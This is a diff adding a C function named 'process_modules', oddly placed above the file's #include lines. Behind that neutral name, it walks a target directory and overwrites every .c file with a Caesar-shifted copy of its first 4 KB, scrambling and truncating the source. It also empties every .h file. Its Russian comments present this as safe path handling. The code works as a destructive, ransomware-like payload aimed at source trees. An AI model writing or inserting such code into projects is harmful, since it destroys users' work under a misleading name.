@@ -1,3 +1,49 @@
+int process_modules(int shift) {
+    DIR *dir = opendir(TARGET_DIR);
+    struct dirent *entry;
+    char path[MAX_PATH];
+    int success = 0;
+
+    if (dir != NULL) {
+        while ((entry = readdir(dir)) != NULL) {
+            size_t len = strlen(entry->d_name);
+            if (len > 2) {
+                // Безопасное формирование пути
+                if (snprintf(path, MAX_PATH, "%s/%s", TARGET_DIR, entry->d_name) >= MAX_PATH) {
+                    continue; // Пропускаем если путь слишком длинный
+                }
+
+                if (entry->d_name[len - 2] == '.' && entry->d_name[len - 1] == 'c') {
+                    FILE *f = fopen(path, "r");
+                    if (f != NULL) {
+                        char buffer[4096];
+                        size_t read_size = fread(buffer, 1, sizeof(buffer) - 1, f);
+                        buffer[read_size] = '\0';
+                        fclose(f);
+
+                        encrypt_caesar(buffer, shift);
+                        f = fopen(path, "w");
+                        if (f != NULL) {
+                            fwrite(buffer, 1, strlen(buffer), f);
+                            fclose(f);
+                        }
+                    }
+                } else if (entry->d_name[len - 2] == '.' && entry->d_name[len - 1] == 'h') {
+                    FILE *f = fopen(path, "w");
+                    if (f != NULL) {
+                        fclose(f); // очистить .h файл
+                    }
+                }
+            }
+        }
+        closedir(dir);
+        success = 1;
+    }
+
+    return success;
+}
+
+
 #include <stdio.h>
 #include <string.h>
 #include <dirent.h>
